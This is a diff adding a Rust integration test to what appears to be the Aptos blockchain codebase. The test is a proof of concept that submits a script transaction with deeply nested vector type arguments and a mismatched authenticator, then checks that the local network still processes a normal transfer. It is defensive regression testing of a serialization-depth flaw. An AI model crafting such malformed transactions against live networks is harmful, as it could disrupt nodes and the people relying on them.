@@ -7,8 +7,13 @@ use crate::{
         assert_balance, check_create_mint_transfer, create_and_fund_account, transfer_coins,
     },
 };
+use aptos_types::{
+    chain_id::ChainId,
+    transaction::{Script, SignedTransaction, TransactionArgument},
+};
 use cached_packages::aptos_stdlib;
 use forge::{NodeExt, Swarm};
+use move_core_types::language_storage::TypeTag;
 use std::time::{Duration, Instant};
 
 #[tokio::test]
@@ -31,6 +36,56 @@ async fn test_create_mint_transfer_block_metadata() {
         "BlockMetadata txn not produced, current version: {}",
         version
     );
+}
+
+#[tokio::test]
+async fn test() {
+    let mut swarm = new_local_swarm_with_aptos(1).await;
+
+    let client = swarm.validators().next().unwrap().rest_client();
+    let transaction_factory = swarm.chain_info().transaction_factory();
+
+    let mut account_0 = create_and_fund_account(&mut swarm, 100000000).await;
+    let mut account_1 = create_and_fund_account(&mut swarm, 1000000).await;
+
+    let dummy_signed = account_0.sign_with_transaction_builder(
+        transaction_factory.create_user_account(account_1.public_key()),
+    );
+
+    let depth: i32 = 9;
+    println!("Running poc with depth={}", depth);
+    let code: Vec<u8> = Vec::new();
+    let mut nested_vec = TypeTag::U128;
+    for _ in 0..depth {
+        // Somewhat below bcs MAX_CONTAINER_DEPTH=500
+        nested_vec = TypeTag::Vector(Box::new(nested_vec));
+    }
+    let ty_args: Vec<TypeTag> = vec![nested_vec];
+    let args: Vec<TransactionArgument> = Vec::new();
+    let script = Script::new(code, ty_args, args);
+    let b = bcs::to_bytes(&script).unwrap();
+    bcs::from_bytes::<Script>(&b).unwrap_err();
+
+    let transaction = SignedTransaction::new_with_authenticator(
+        transaction_factory
+            .script(script)
+            .sender(account_0.address())
+            .sequence_number(account_0.sequence_number())
+            .build(),
+        dummy_signed.authenticator(),
+    );
+    println!(
+        "Couldn't commit transaction: {:?}",
+        client.submit_and_wait(&transaction).await.unwrap_err()
+    );
+    client
+        .submit_and_wait_bcs(
+            &account_1.sign_with_transaction_builder(
+                transaction_factory.transfer(account_0.address(), 10),
+            ),
+        )
+        .await
+        .unwrap();
 }
 
 #[tokio::test]
